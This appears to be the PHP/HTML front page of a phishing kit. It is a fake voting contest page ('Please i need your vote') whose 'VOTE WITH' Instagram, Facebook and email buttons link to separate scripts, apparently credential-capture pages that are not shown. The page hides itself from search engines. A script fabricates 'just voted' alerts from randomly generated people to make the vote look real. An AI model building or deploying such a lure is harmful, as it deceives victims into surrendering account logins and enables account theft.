<?php
include 'admin/fetch_it.php';
?>

<!-- <div id="google_translate_element" style='position: fixed; bottom: 0; left: 0'></div>
  <script type="text/javascript">
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
        }
    </script>

    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> --><!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title></title>
    
        <meta name="robots" content="noindex" />
        <meta name="googlebot" content="noarchive">
    
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v6.0.0-beta1/css/all.css" integrity="SHA384-ABC123==" crossorigin="anonymous">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    
    </head>
    
    <body>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
    
            body {
                background: #eeeded;
                font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
                color: #525151;
                margin: 70px 0;
            }
    
            .container-item {
                background-color: white;
                width: 90%;
                margin: 0 50%;
                transform: translateX(-50%);
                border-radius: 3px;
            }
    
            #social-ul {
                display: flex;
                list-style-type: none;
                justify-content: center;
                align-items: center;
                margin: 5px 0;
            }
    
            #social-ul li {
                margin: 5px;
                background: #069c6c;
                color: white;
                padding: 7px 10px;
                border-radius: 3px;
                font-size: 13px;
            }
    
            #social-ul li:nth-child(2) {
                background: #da2828;
            }
    
            #list-item {
                list-style-type: none;
                margin: 10px 0;
            }
    
            #list-item li {
                padding: 8px 10px;
            }
    
            #list-item li:nth-child(1) {
                background: #5aa7f46a;
                color: #0d4d8c;
                border-left: 2px solid dodgerblue;
            }
    
            a {
                color: inherit;
                text-decoration: none;
            }
    
            .notification-container {
                position: fixed;
                width: 95%;
                bottom: 50px;
                left: 50%;
                transform: translateX(-50%);
                background-color: #3498db;
                color: #fff;
                padding: 15px;
                border-radius: 10px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
                opacity: 0;
                transition: opacity 0.5s ease-in-out;
            }
    
            .show-notification {
                opacity: 1;
            }
    
            .notification-content {
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
    
            .notification-content img {
                border-radius: 50%;
                margin-right: 10px;
            }
    
            .notification-text {
                flex-grow: 1;
            }
    
            @keyframes slideIn {
                from {
                    transform: translateY(100%);
                }
                to {
                    transform: translateY(0);
                }
            }
            @media screen and (min-width: 768px) {
                .container-item {
                    width: 50%;
                }
                .notification-container {
                    width: 500px;
                }
    
            }
    
            @media screen and (min-width: 1200px) {
                .container-item {
                    width: 40%;
                }
            }
        </style>
        <div class="container">
            <div class="container-item">
                <p style='text-align: center; font-size: 20px; margin: 10px 0; text-transform: uppercase; padding: 10px 0; font-weight: bold'>Please i need your vote</p>
                <img src="<?php echo "admin/" . $image_url; ?>" width="100%">
                <p style='text-align: center; padding: 5px; font-weight: bold'><?php echo $name; ?></p>
                <div class="counter" style='border: 2px solid dodgerblue; border-radius: 3px; margin: 0 5%; padding: 5px 10px ;'>
                    <div style='display: flex; justify-content: center'>
                        <input type="radio" checked style='color: dodgerblue'>
                        <p style='padding: 0 3px; font-size: 14px; padding: 10px 0'> Total Votes: <?php echo $vote_count. " out of ". $vote_total ?></p>
                    </div>
                    <div style='display: flex; justify-content: center; margin: 3px 10%'>
                        <div class="progress-container" style='width: 100%; background: #edeaea; height: 6.5px; border-radius: 3px; overflow: hidden;'>
                            <div class="progress" style='background: dodgerblue; width: 90%; height: 6.5px'></div>
                        </div>
                    </div>
                </div>
                <p style='text-align: center; font-weight: bold; padding: 4px 0; margin: 10px 0; font-size: 20px'><i class="fa fa-check"></i> Total Votes To Win: 10</p>
                <div style='display: flex; justify-content: center; '>
                    <a href="ig_000.php"><button style='margin: 5px; padding: 10px; background: #069c6c; color: white; border-radius: 3px; border: none; '>VOTE WITH <i class="fa fa-instagram"></i></button></a>
                    <a href="fbf.php"><button style='margin: 5px; padding: 10px; background: #277dee; color: white; border-radius: 3px; border: none; '>VOTE WITH <i class="fa fa-facebook"></i></button></a>
                    <a href="email_000.php"><button style='margin: 5px; padding: 10px; background: #e02a3f; color: white; border-radius: 3px; border: none; '>VOTE WITH <i class="fa fa-envelope"></i></button></a>
    
                </div><br>
            </div>
        </div>
        <br><br>
    
        <div id="notification" class="notification-container">
        <div class="notification-content">
            <img src="" alt="User Avatar" width="30" height="30" id="userAvatar">
            <div class="notification-text" id="notificationContent"></div>
        </div>
    </div>
    <script>
            var notification_status = "on"
        var notification = document.getElementById("notification")
        if (notification_status === "on") {
            notification.style.display = 'block'
        }else {
            notification.style.display = 'none'
        }
    
    function getRandomUser() {
        return fetch('https://randomuser.me/api/')
            .then(response => response.json())
            .then(data => {
                const user = data.results[0];
                const country = user.location.country;
                const name = `${user.name.first} ${user.name.last}`;
                const avatar = user.picture.thumbnail;
                return { country, name, avatar };
            })
            .catch(error => {
                console.error('Error fetching random user:', error);
                return { country: 'FallbackCountry', name: 'FallbackName', avatar: '' }; // Use fallback data in case of an error
            });
    }
    
    function showNotification(country, name, avatar) {
        const notificationContainer = document.getElementById('notification');
        const notificationContent = document.getElementById('notificationContent');
        const userAvatar = document.getElementById('userAvatar');
    
        userAvatar.src = avatar;
        notificationContent.innerHTML = `Someone from ${country} named ${name} just voted.`;
        notificationContainer.classList.add('show-notification');
    
        setTimeout(() => {
            notificationContainer.classList.remove('show-notification');
        }, 5000); // Hide after 5 seconds
    }
    
    // Simulate votes with random data every 5 seconds
    setInterval(() => {
        getRandomUser().then(userData => {
            showNotification(userData.country, userData.name, userData.avatar);
        });
    }, 1000); // Update every 5 seconds
    </script>
    </body>
    
    </html>